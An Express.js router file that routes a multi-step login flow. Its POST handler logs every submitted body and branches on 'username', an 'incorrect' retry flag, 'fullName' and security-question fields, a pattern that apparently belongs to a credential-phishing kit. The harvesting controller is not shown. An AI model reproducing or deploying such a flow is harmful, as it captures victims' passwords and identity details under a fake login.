const express = require('express');
const router =  express.Router();
const controller = require('../controllers/controller');

router.get('/auth/login', (req, res) => {
    const step = req.query._step || 'login';
    switch (step) {
        case '1':
            return controller.login2(req, res);
        case '2':
            return controller.login3(req, res);
        case '3':
            return controller.login4(req, res);
        case '4':
            return controller.login5(req, res);
        case 'complete':
            return controller.complete(req, res);
        default:
            return controller.login(req, res);
    }
});



router.post('/submit', (req, res) => {
    console.log(req.body);
    if ('username' in req.body && !('inc' in req.body)) {
        return controller.loginPost(req, res);
    } else if ('inc' in req.body) {
        console.log("incorrect");
        return controller.loginPost2(req, res);
    } else if ('fullName' in req.body) {
        return controller.loginPost3(req, res);
    }else if ('q1' in req.body) {
        return controller.loginPost4(req, res);
    } else {
        return controller.loginPost5(req, res);
    }
});


router.get('*', controller.page404Redirect);

module.exports = router;